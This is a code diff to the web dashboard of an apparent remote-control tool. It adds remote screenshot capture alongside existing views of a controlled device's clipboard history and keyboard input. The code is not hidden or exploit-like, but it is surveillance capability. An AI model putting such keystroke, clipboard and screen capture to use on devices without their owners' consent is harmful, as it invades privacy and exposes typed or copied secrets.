@@ -19,13 +19,19 @@ const clipboardHintEl = document.getElementById("clipboardHint");
 const clearClipboardBtn = document.getElementById("clearClipboardBtn");
 const keyboardListEl = document.getElementById("keyboardList");
 const clearKeyboardBtn = document.getElementById("clearKeyboardBtn");
+const screenshotBtn = document.getElementById("screenshotBtn");
+const clearScreenshotsBtn = document.getElementById("clearScreenshotsBtn");
+const screenshotListEl = document.getElementById("screenshotList");
+const screenshotHintEl = document.getElementById("screenshotHint");
 const mouseTrackToggle = document.getElementById("mouseTrackToggle");
 const ctx = canvas.getContext("2d");
 
 const MAX_CLIPBOARD_UI = 300;
 const MAX_KEYBOARD_UI = 300;
+const MAX_SCREENSHOT_UI = 80;
 let clipboardEntries = [];
 let keyboardEntries = [];
+let screenshotEntries = [];
 
 const params = new URLSearchParams(window.location.search);
 if (params.get("device")) deviceInput.value = params.get("device");
@@ -165,6 +171,7 @@ function renderDevices(devices) {
         setClipboardHint(`设备: ${d.deviceId}`);
         loadClipboardHistory(d.deviceId);
         loadKeyboardHistory(d.deviceId);
+        loadScreenshotHistory(d.deviceId);
         connect();
       });
     }
@@ -304,6 +311,82 @@ async function loadKeyboardHistory(deviceId) {
   }
 }
 
+function setScreenshotHint(text) {
+  if (screenshotHintEl) screenshotHintEl.textContent = text;
+}
+
+function downloadScreenshot(entry) {
+  if (!entry?.data) return;
+  const link = document.createElement("a");
+  link.href = `data:image/jpeg;base64,${entry.data}`;
+  link.download = `screenshot-${entry.id || Date.now()}.jpg`;
+  link.click();
+}
+
+function renderScreenshots() {
+  screenshotListEl.innerHTML = "";
+  if (!screenshotEntries.length) {
+    screenshotListEl.innerHTML = '<li class="empty">暂无截屏记录</li>';
+    return;
+  }
+
+  for (const entry of screenshotEntries.slice(0, MAX_SCREENSHOT_UI)) {
+    const li = document.createElement("li");
+    li.className = "screenshot-item";
+    const time = new Date(entry.time).toLocaleString();
+    const size = entry.width && entry.height ? `${entry.width}×${entry.height}` : "—";
+    li.innerHTML = `
+      ${entry.data ? `<img src="data:image/jpeg;base64,${entry.data}" alt="screenshot" />` : '<div class="empty">加载中...</div>'}
+      <div class="screenshot-meta">
+        <span>${time}</span>
+        <span>${size}</span>
+      </div>
+      <span class="clipboard-tag">点击查看 · 右键下载</span>
+    `;
+    li.addEventListener("click", () => {
+      if (!entry.data) return;
+      window.open(`data:image/jpeg;base64,${entry.data}`, "_blank");
+    });
+    li.addEventListener("contextmenu", (e) => {
+      e.preventDefault();
+      downloadScreenshot(entry);
+    });
+    screenshotListEl.appendChild(li);
+  }
+}
+
+function addScreenshotEntry(entry) {
+  if (!entry || !entry.id) return;
+  if (screenshotEntries.some((e) => e.id === entry.id)) return;
+  screenshotEntries.unshift(entry);
+  if (screenshotEntries.length > MAX_SCREENSHOT_UI) {
+    screenshotEntries.length = MAX_SCREENSHOT_UI;
+  }
+  renderScreenshots();
+}
+
+async function loadScreenshotHistory(deviceId) {
+  try {
+    const data = await apiFetch(
+      `/api/screenshots?deviceId=${encodeURIComponent(deviceId)}&limit=${MAX_SCREENSHOT_UI}`
+    );
+    screenshotEntries = data.entries || [];
+    renderScreenshots();
+  } catch {
+    screenshotEntries = [];
+    screenshotListEl.innerHTML = '<li class="empty">无法加载截屏记录</li>';
+  }
+}
+
+function requestScreenshot() {
+  if (!ws || ws.readyState !== WebSocket.OPEN) {
+    setScreenshotHint("请先连接设备");
+    return;
+  }
+  sendControl({ action: "screenshot" });
+  setScreenshotHint("已请求截屏，等待被控端响应...");
+}
+
 function renderAudit(entries) {
   auditListEl.innerHTML = "";
   if (!entries.length) {
@@ -353,6 +436,9 @@ function connectDashboard() {
     if (!ws && msg.type === "keyboard_input" && msg.deviceId === currentDeviceId() && msg.entry) {
       addKeyboardEntry(msg.entry);
     }
+    if (!ws && msg.type === "screenshot_capture" && msg.deviceId === currentDeviceId() && msg.entry) {
+      addScreenshotEntry(msg.entry);
+    }
   };
   dashWs.onclose = () => {
     setTimeout(connectDashboard, 3000);
@@ -380,6 +466,9 @@ function connect() {
     disconnectBtn.disabled = false;
     loadClipboardHistory(deviceId);
     loadKeyboardHistory(deviceId);
+    loadScreenshotHistory(deviceId);
+    screenshotBtn.disabled = false;
+    setScreenshotHint(`设备: ${deviceId}`);
   };
 
   ws.onmessage = (event) => {
@@ -402,6 +491,7 @@ function connect() {
       keyboardEntries = msg.keyboard || [];
       renderClipboard();
       renderKeyboard();
+      loadScreenshotHistory(deviceId);
       return;
     }
 
@@ -412,6 +502,12 @@ function connect() {
 
     if (msg.type === "keyboard_input" && msg.entry) {
       addKeyboardEntry(msg.entry);
+      return;
+    }
+
+    if (msg.type === "screenshot_capture" && msg.entry) {
+      addScreenshotEntry(msg.entry);
+      setScreenshotHint(`设备: ${deviceId} · 截屏已更新`);
       return;
     }
 
@@ -433,6 +529,7 @@ function connect() {
     else setStatus("未连接", false);
     connectBtn.disabled = false;
     disconnectBtn.disabled = true;
+    screenshotBtn.disabled = true;
     ws = null;
   };
 
@@ -503,6 +600,11 @@ clearKeyboardBtn.addEventListener("click", () => {
   keyboardEntries = [];
   renderKeyboard();
 });
+screenshotBtn.addEventListener("click", requestScreenshot);
+clearScreenshotsBtn.addEventListener("click", () => {
+  screenshotEntries = [];
+  renderScreenshots();
+});
 function updateMouseTrackUi() {
   canvas.style.cursor = isMouseTrackEnabled() ? "crosshair" : "default";
 }
@@ -525,5 +627,6 @@ window.addEventListener("beforeunload", () => {
 
 renderClipboard();
 renderKeyboard();
+renderScreenshots();
 refreshDashboard();
 connectDashboard();
